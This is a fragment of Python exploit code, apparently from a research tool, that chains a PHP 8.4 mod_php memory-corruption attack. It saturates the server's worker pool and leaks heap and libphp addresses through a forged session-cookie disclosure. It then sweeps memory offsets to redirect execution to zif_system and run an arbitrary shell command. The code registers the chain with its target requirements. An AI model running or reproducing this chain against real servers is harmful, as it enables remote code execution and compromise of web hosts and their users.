        if strategy in ("saturate", "full") and workers:
            holders = WorkerHolders(ctx, max(1, int(workers) - 1))
            holders.start()
            result["holders"] = len(holders.sockets)

        def run_leak():
            return leak(
                ctx, lines=lines, dtor=dtor, attempts=attempts,
                fillers=fillers, arrays=arrays,
                window_probe=window_probe, window_full=window_full,
                front_ceiling=ceiling,
            )

        outcome = run_leak()
        result["leak"] = outcome
        if not outcome.get("heap") or not outcome.get("libphp"):
            producer = outcome.get("producer") or {}
            if producer.get("refused"):
                result["verdict"] = "PRODUCER_REFUSED"
            elif producer.get("blocked"):
                result["verdict"] = "PRODUCER_BLOCKED"
            elif outcome.get("cookie_bytes") == ORDINARY_COOKIE_BYTES:
                result["verdict"] = "LEAK_FAILED_CLOSED"
            else:
                result["verdict"] = "LEAK_FAILED"
            result["error"] = outcome.get("reason") or "both-bases disclosure failed"
            return result
        if timing:
            command = f"sleep {sleep_n}"
        sweep_result = sweep(
            ctx,
            heap=outcome["heap"],
            libphp=outcome["libphp"],
            zif_offset=zif_offset,
            cmd=command.encode("latin1"),
            lines=lines,
            r0_lo=r0_lo,
            r0_hi=r0_hi,
            r0_step=r0_step,
            lowbits=lowbits,
            packed=packed,
            releak_every=releak_every,
            attempts_limit=int(options.get("tr_sweep_max") or 0),
            fetch_path=fetch_path,
            expect=expectation,
            timing=timing,
            sleep_n=sleep_n,
            leak_retry=run_leak,
        )
        result["sweep"] = {
            key: sweep_result[key]
            for key in (
                "pages",
                "candidates",
                "packed",
                "lowbits",
                "releaks",
                "proof",
                "verdict",
                "reason",
                "baseline_s",
            )
        }
        result["attempts"] = sweep_result["attempts"]
        result["proof"] = sweep_result["proof"]
        result["verdict"] = sweep_result["verdict"]
        if not sweep_result["proof"].get("found"):
            result["error"] = sweep_result["reason"]
        result["fire_command"] = command
        return result
    finally:
        if holders is not None:
            holders.close()
        result["requests"] = len(ctx.http.requests)
        result["elapsed_s"] = round(time.monotonic() - started, 2)


@registry.method(
    "transplant_chain",
    kind="chain",
    order=11,
    description="78ResearchLab class: N1 bomb arm, forged-zend_string windowed "
    "session-cookie disclosure, packed r0 sweep -> zif_system (sub-cap mod_php)",
    requires=(
        "mod_php/prefork 8.4.x with a measured offset pair (zif/dtor)",
        "a memory bracket inside the calibrated 8..200 MiB band",
        "a front cap above the 932,589 B arm at the 128 MiB bracket",
        "upload progress + >=1000 multipart parts + use_strict_mode=0",
        "a pool that holder saturation can reduce to one free child",
    ),
    tags=("sub-cap", "windowed-disclosure", "packed-sweep", "mod_php", "78research"),
)
def transplant_chain(ctx: Context) -> dict:
    return run_chain(ctx)
